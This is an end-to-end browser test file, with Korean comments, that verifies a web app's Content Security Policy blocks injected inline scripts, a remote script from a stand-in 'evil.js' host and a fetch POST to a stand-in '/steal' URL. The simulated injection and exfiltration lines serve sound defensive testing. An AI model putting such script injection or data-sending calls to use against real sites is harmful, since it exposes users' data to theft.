// 두 번째 안전장치(보안 규칙 CSP)가 배포용 빌드에 실제로 들어가 있고, 진짜 브라우저가 그 규칙대로 막는지.
// (src/platform/csp.test.js 는 규칙 글자를 보고, 여기서는 브라우저가 정말 막는지를 본다)
// 평소 화면에서 규칙 위반이 없는지는 모든 테스트가 kit.js 에서 함께 본다.
import { test, expect, login } from './kit.js';

test.use({ allowProblems: [/보안 규칙\(CSP\) 위반|Content Security Policy/] });   // 여기서는 일부러 막히게 한다

test('배포용 화면에 보안 규칙이 들어 있다', async ({ page }) => {
  await page.goto('./');
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("script-src 'self'");
  expect(csp).toContain("object-src 'none'");
});

test('누가 화면에 스크립트를 몰래 넣어도 실행되지 않는다 (글 안에 넣은 것 · 바깥 주소 모두)', async ({ page }) => {
  await login(page);
  const result = await page.evaluate(async () => {
    const blocked = [];
    document.addEventListener('securitypolicyviolation', (e) => blocked.push(e.violatedDirective));
    // ① 화면 안에 직접 쓴 스크립트
    const inline = document.createElement('script');
    inline.textContent = 'window.__injected = true';
    document.body.appendChild(inline);
    // ② 바깥 주소의 스크립트 (실제로 요청이 나가기 전에 막힌다)
    const remote = document.createElement('script');
    remote.src = 'https://example.invalid/evil.js';
    document.body.appendChild(remote);
    await new Promise((r) => setTimeout(r, 300));
    return { ran: window.__injected === true, blocked };
  });
  expect(result.ran, '몰래 넣은 스크립트가 실행되면 안 된다').toBe(false);
  expect(result.blocked.filter((d) => d.startsWith('script-src')).length).toBe(2);
});

test('기록을 바깥 서버로 보내려 해도 브라우저가 보내기 전에 막는다', async ({ page }) => {
  await login(page);
  const blocked = await page.evaluate(async () => {
    const seen = [];
    document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective));
    try { await fetch('https://example.invalid/steal', { method: 'POST', body: 'x' }); } catch { /* 막히면 여기로 온다 */ }
    await new Promise((r) => setTimeout(r, 300));
    return seen;
  });
  // 주소가 없어서 실패한 게 아니라, 보안 규칙(connect-src)에 막힌 것이어야 한다
  expect(blocked).toContain('connect-src');
});
